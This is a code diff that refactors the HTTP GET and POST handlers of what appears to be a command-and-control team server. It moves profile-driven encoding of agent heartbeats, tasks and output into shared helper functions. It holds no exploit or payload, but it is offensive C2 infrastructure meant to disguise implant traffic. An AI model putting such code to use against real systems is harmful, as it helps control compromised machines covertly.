@@ -35,7 +35,6 @@ proc httpGet*(request: Request) =
     {.cast(gcsafe).}:
 
         # Check heartbeat metadata placement
-        var heartbeat: seq[byte]
         var heartbeatString: string
 
         case cq.profile.getString("http-get.agent.heartbeat.placement.type"): 
@@ -58,19 +57,8 @@ proc httpGet*(request: Request) =
 
         else: discard 
 
-        # Retrieve and apply data transformation to get raw heartbeat packet
-        let 
-            prefix = cq.profile.getString("http-get.agent.heartbeat.prefix")
-            suffix = cq.profile.getString("http-get.agent.heartbeat.suffix")
-            encHeartbeat = heartbeatString[len(prefix) ..^ len(suffix) + 1]
-
-        case cq.profile.getString("http-get.agent.heartbeat.encoding.type", default = "none"): 
-        of "base64":
-            heartbeat = string.toBytes(decode(encHeartbeat)) 
-        of "hex":
-            heartbeat = string.toBytes(parseHexStr(encHeartbeat))
-        of "none":
-            heartbeat = string.toBytes(encHeartbeat) 
+        # Reverse data transformation to get raw heartbeat packet
+        let heartbeat = cq.profile.reverseDataTransformation("http-get.agent.heartbeat", heartbeatString)
 
         try: 
             var responseBytes: seq[byte]
@@ -89,27 +77,18 @@ proc httpGet*(request: Request) =
                 responseBytes.add(task)
             
             # Apply data transformation to the response
-            var response: string
-            case cq.profile.getString("http-get.server.output.encoding.type", default = "none"): 
-            of "none": 
-                response = Bytes.toString(responseBytes)
-            of "base64":
-                response = encode(responseBytes, safe = cq.profile.getBool("http-get.server.output.encoding.url-safe"))
-            else: discard
-
-            let prefix = cq.profile.getString("http-get.server.output.prefix")
-            let suffix = cq.profile.getString("http-get.server.output.suffix")
+            let payload = cq.profile.applyDataTransformation("http-get.server.output", responseBytes)
 
             # Add headers, as defined in the team server profile 
             var headers: HttpHeaders
             for header, value in cq.profile.getTable("http-get.server.headers"):
                 headers.add((header, value.getStringValue()))
 
-            request.respond(200, headers = headers, body = prefix & response & suffix)
+            request.respond(200, headers = headers, body = payload)
 
             # Notify operator that agent collected tasks
-            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$response.len} bytes sent.")
-            cq.info(fmt"{$response.len} bytes sent.")
+            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.")
+            cq.info(fmt"{$responseBytes.len} bytes sent.")
 
         except CatchableError as err:
             request.respond(404, body = "")
@@ -124,7 +103,6 @@ proc httpPost*(request: Request) =
         try:        
             # Retrieve data from the request
             var dataString: string
-            var data: seq[byte]
             
             case cq.profile.getString("http-post.agent.output.placement.type"): 
             of "header": 
@@ -146,19 +124,8 @@ proc httpPost*(request: Request) =
 
             else: discard 
 
-            # Retrieve and reverse data transformation
-            let 
-                prefix = cq.profile.getString("http-post.agent.output.prefix")
-                suffix = cq.profile.getString("http-post.agent.output.suffix")
-                encData = dataString[len(prefix) ..^ len(suffix) + 1]
-
-            case cq.profile.getString("http-post.agent.output.encoding.type", default = "none"): 
-            of "base64":
-                data = string.toBytes(decode(encData)) 
-            of "hex":
-                data = string.toBytes(parseHexStr(encData))
-            of "none":
-                data = string.toBytes(encData) 
+            # Reverse data transformation
+            let data = cq.profile.reverseDataTransformation("http-post.agent.output", dataString)
 
             # Add response headers, as defined in team server profile
             var headers: HttpHeaders
